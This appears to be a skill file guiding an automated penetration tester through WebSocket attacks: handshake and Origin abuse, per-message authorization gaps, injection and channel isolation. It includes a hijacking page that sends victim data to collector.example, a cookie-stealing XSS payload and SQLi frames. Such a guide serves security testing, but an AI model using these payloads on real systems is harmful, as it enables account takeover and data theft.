---
name: websocket
description: WebSocket testing for handshake/origin flaws, auth gaps, message tampering, and cross-site hijacking
---

# WebSocket

A WebSocket endpoint upgrades an HTTP connection into a persistent, full-duplex `ws://`/`wss://` channel that carries application messages (often JSON, MessagePack, or a custom binary frame) outside the normal request/response model. The attacker's objective is to abuse the one-time HTTP handshake (where most auth and `Origin` enforcement lives) and then tamper with the long-lived bidirectional message stream that frequently skips the per-message authorization, validation, and rate limiting applied to REST routes.

## Attack Surface

**Scope**
- The HTTP `Upgrade: websocket` handshake (auth, `Origin`, cookies, tokens, subprotocols)
- Inbound client→server messages (commands, RPC, GraphQL/STOMP/SignalR/Socket.IO/MQTT-over-WS, chat)
- Outbound server→client broadcasts (data leaked to the wrong subscriber/room/tenant)
- Reverse-proxy/CDN/load-balancer upgrade path (smuggling, header rewriting, sticky sessions)

**Entry Points**
- Endpoints: `/ws`, `/socket`, `/cable` (Rails ActionCable), `/socket.io/`, `/graphql` (subscriptions), `/signalr`, `/stomp`, `/mqtt`, `/_next/webpack-hmr`, `/livereload`
- Auth material: cookies sent automatically on handshake, `?token=`/`?access_token=` query params, `Sec-WebSocket-Protocol` carrying a bearer token, first-message `auth` envelope
- Channel/room/topic identifiers and subscription filters chosen by the client
- Message `type`/`action`/`event` dispatch fields routed to server handlers

**Less Obvious**
- HMR/livereload dev sockets exposed in production
- Admin/metrics/log-tail sockets with weaker auth than the main app
- gRPC-Web / WebTransport fallbacks and Socket.IO long-polling transport (`?transport=polling`) which behaves like plain HTTP

## Recon & Enumeration

Discover endpoints from the running app and JS bundles:
```
katana -u https://target.tld -jc -kf all -d 3 -o katana.txt
grep -aiE 'wss?://|new WebSocket|io\(|socket\.io|/cable|/signalr|stomp|webpack-hmr' katana.txt
# crawl + dump JS, then grep paths/tokens
katana -u https://target.tld -jc -em js -o js_urls.txt
ffuf -u https://target.tld/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 101,200,400,426 -fs 0
```

Fingerprint the handshake and tech with httpx/nuclei (101 == upgrade accepted):
```
httpx -l targets.txt -H "Connection: Upgrade" -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
  -status-code -title -tech-detect -o httpx_ws.txt
nuclei -u https://target.tld -tags websocket,socketio,signalr,exposure -s critical,high,medium -silent
naabu -host target.tld -p 80,443,8080,8443,3000,6001,15674 -silent   # find non-standard ws ports
```

Interactive clients in/for the Kali sandbox (install asset-specific tooling as needed):
```
pip install websocket-client websockets   # python clients + wsdump.py
npm i -g wscat                             # CLI: wscat -c wss://target.tld/ws
# wsrepl (interactive WS pentest REPL) and STÖK's "ws" tooling:
pipx install wsrepl
# Burp Suite (sandbox): Proxy > WebSockets history; repeat/edit frames in Repeater
```

Connect and observe, sending raw frames:
```
wscat -c "wss://target.tld/ws" -H "Origin: https://target.tld" -H "Cookie: session=..."
# read-only capture of server pushes
python3 -c "import websocket,sys; ws=websocket.create_connection('wss://target.tld/ws'); \
print(ws.recv())"
```

## Methodology

1. **Map endpoints & transport** — Crawl with katana, grep JS for `new WebSocket`, `io()`, `/cable`, `/signalr`. Note path, subprotocol, framing (JSON vs binary vs Socket.IO/STOMP), and where auth lives (cookie/query/subprotocol/first message).
2. **Baseline a legit session** — In Burp, log in normally and capture a full working handshake + the message sequence (subscribe, auth, a real command and its response). This is your replay template.
3. **Attack the handshake** — Replay the upgrade with a forged/missing `Origin`, no cookies, an expired/null token, and a foreign user's token. Record what the server accepts.
4. **Test cross-site hijacking (CSWSH)** — Determine whether the connection is authenticated purely by ambient cookies with no `Origin` check and no CSRF-style token.
5. **Probe per-message authz** — After connecting as a low-priv user, swap IDs/channels/topics in messages to access other users/tenants/rooms (the WS equivalent of IDOR/BFLA).
6. **Tamper message content** — Mutate `type`/`action`, inject extra fields (mass assignment), send malformed/oversized/out-of-order frames, and feed message payloads into XSS/SQLi/NoSQLi/SSTI/command sinks.
7. **Test channel/subscription isolation** — Subscribe to wildcard or other tenants' topics; check if broadcasts leak to unauthorized subscribers.
8. **Resource & lifecycle** — Auth-after-connect race, ping/pong and idle timeout abuse, unbounded message size, connection flooding, slow-loris on the upgrade.
9. **Validate & chain** — Build a minimal PoC (a single HTML page for CSWSH, or a scripted client) proving cross-user data access or state change, then map to durable impact.

## Key Weaknesses / Techniques

### Missing/weak Origin validation → Cross-Site WebSocket Hijacking (CSWSH)
Browsers send cookies on a cross-origin WS handshake and the same-origin policy does **not** block opening a WebSocket. If the server authenticates only via cookies and does not validate `Origin`, an attacker page silently connects as the victim. Assess by replaying the handshake with an arbitrary origin:
```
wscat -c "wss://target.tld/ws" -H "Origin: https://evil.example" -H "Cookie: session=<victim>"
```
PoC page (victim simply visits) — exfiltrates streamed data:
```html
<script>
const ws = new WebSocket("wss://target.tld/ws");      // cookies auto-sent
ws.onopen = () => ws.send(JSON.stringify({type:"getMessages"}));
ws.onmessage = e => fetch("https://collector.example/x?d="+encodeURIComponent(e.data));
</script>
```
If the handshake succeeds and returns victim data with a forged/absent `Origin`, it is exploitable.

### Authentication & authorization gaps
- **No auth on socket**: handshake accepted with no cookie/token at all; sensitive channels reachable anonymously.
- **Auth on handshake only, none per-message**: a valid connection becomes a skeleton key — every subsequent action is trusted. Swap object IDs in messages to reach other users (IDOR), or invoke admin `action`s as a normal user (BFLA).
- **Token in query string**: `wss://target/ws?token=JWT` leaks into proxy logs, Referer, and browser history. Validate the JWT itself with `jwt_tool` (alg confusion, `none`, weak secret, missing `exp`):
  ```
  jwt_tool "<token>" -t wss://target.tld/ws -M at
  ```
- **Auth-after-connect race**: server lets you act before the auth message is processed. Send a privileged command in the same burst as (or before) the `auth` frame.

### Message tampering / injection
The message body is just attacker-controlled input on a path that often lacks WAF and server-side validation:
- **Type/action confusion & mass assignment**: add fields the client UI never sends.
  ```json
  {"action":"updateProfile","userId":1337,"role":"admin","email":"a@b.c"}
  ```
- **Injection sinks via frames**: messages rendered in another user's browser (stored/blind XSS), used in DB queries (SQLi/NoSQLi), templates (SSTI), or shelled out (RCE). Verify XSS reaching another viewer with a non-loading marker:
  ```json
  {"type":"chat","room":"general","msg":"<img src=x onerror=fetch('//c.example/'+document.cookie)>"}
  ```
  SQLi via a filter field:
  ```
  wscat -c wss://target.tld/ws
  > {"action":"search","q":"foo' AND SLEEP(5)-- -"}
  ```
- **Blind injection / SSRF over WS**: embed an OAST domain. `interactsh-client -v` (in the sandbox) issues a fresh `*.oast.fun` host; send it in a URL/host field and watch for the callback.

### Channel / subscription isolation failures
Subscribe to topics outside your tenant/room. ActionCable, STOMP, Socket.IO rooms, and GraphQL subscriptions often trust the client-supplied identifier:
```
> {"command":"subscribe","identifier":"{\"channel\":\"AdminChannel\"}"}
> SUBSCRIBE id:0 destination:/topic/tenant-9999/orders        # STOMP, other tenant
```
If you receive another tenant's broadcasts, isolation is broken.

### Transport / infrastructure issues
- **`wss` downgrade to `ws`**: cleartext fallback enables MITM token capture.
- **Proxy upgrade smuggling**: inconsistent `Connection`/`Upgrade` handling between front proxy and origin (cross-reference HTTP request smuggling techniques).
- **DoS**: no max message size, no per-connection rate limit, unbounded concurrent connections, missing idle/ping timeout (slowloris on open sockets).
- **Reflected data in handshake response** echoing `Sec-WebSocket-Protocol`.

## Validation

1. **CSWSH**: host the PoC page on a different origin, load it in an authenticated browser session, and capture cross-origin delivery of victim data (or an attacker-driven state change) to your collector. The decisive proof is the handshake succeeding with a foreign `Origin` and victim cookies.
2. **Broken per-message authz**: as user A, send a message referencing user B's resource and show B's data returned, or B's state changed — confirm with B's account or an out-of-band read.
3. **Injection**: demonstrate effect, not just reflection — XSS firing in a *different* viewer's session, a measurable time delay for SQLi (`SLEEP`), an `interactsh` callback for blind SSRF/injection, or template math evaluation for SSTI.
4. **Reproducibility**: capture the exact frame sequence (handshake headers + ordered messages) so the finding replays deterministically via `wscat`/script. Note the minimal precondition (e.g., "any logged-in user").

## False Positives

- **`Origin` accepted but no ambient auth**: if the socket requires a token the attacker cannot obtain (not just a cookie), a permissive `Origin` alone is not CSWSH.
- **101 upgrade with no sensitive data/actions**: HMR/livereload/echo or public-broadcast sockets that expose nothing private.
- **Self-inflicted XSS**: payload only renders in the sender's own client, never reaching another user.
- **OAST hit from the tester's host**: callback source IP is your machine/browser, not the server — a client-side fetch, not server-side SSRF.
- **Timing "SQLi"** explained by network jitter, not the payload — confirm with a clean baseline and a conditional true/false pair.
- **Subprotocol/echo reflection** with no execution context.

## Chaining & Impact

- CSWSH → read victim's live data and drive authenticated actions (silent account takeover, fund transfer, message exfiltration).
- Handshake-only auth → per-message IDOR/BFLA → cross-tenant data access and privilege escalation.
- Message-borne stored XSS in chat/notifications → session theft of every viewer, including admins → full takeover.
- SQLi/NoSQLi/SSTI/command sink reached via frames → data exfiltration or RCE on the WS worker.
- Leaked token (query string / `ws` downgrade) → session replay; combine with weak JWT (`jwt_tool`) for forgery.
- Channel isolation break → mass data leak across tenants; broadcast injection → worm-like propagation to all subscribers.

## Pro Tips

1. Most auth and `Origin` enforcement happens **only** on the one HTTP handshake — attack there first, then assume every later message is implicitly trusted and probe per-message authz.
2. SameSite cookies do **not** reliably stop CSWSH; the upgrade is a top-level navigation-like GET and is frequently exempt. Always test cross-origin regardless of cookie flags.
3. Use Burp's WebSockets history to replay and edit individual frames — far faster than rebuilding sessions in `wscat` for each mutation.
4. Identify the framing first (raw JSON vs Socket.IO's `42["event",{...}]` vs STOMP vs MessagePack). Sending the wrong envelope yields false negatives that look like "not vulnerable."
5. Tokens in the URL are an immediate finding even before exploitation — they leak via logs, Referer, and history.
6. Race the auth: fire a privileged command in the same TCP burst as the auth frame to catch order-of-operations bugs.
7. Hunt dev/HMR sockets (`/_next/webpack-hmr`, `/livereload`, `:35729`) left enabled in production — they often expose source paths and weak controls.
8. Keep a quiet read-only listener open in one terminal while you inject from another, so you can attribute leaked broadcasts to a specific tampered message.
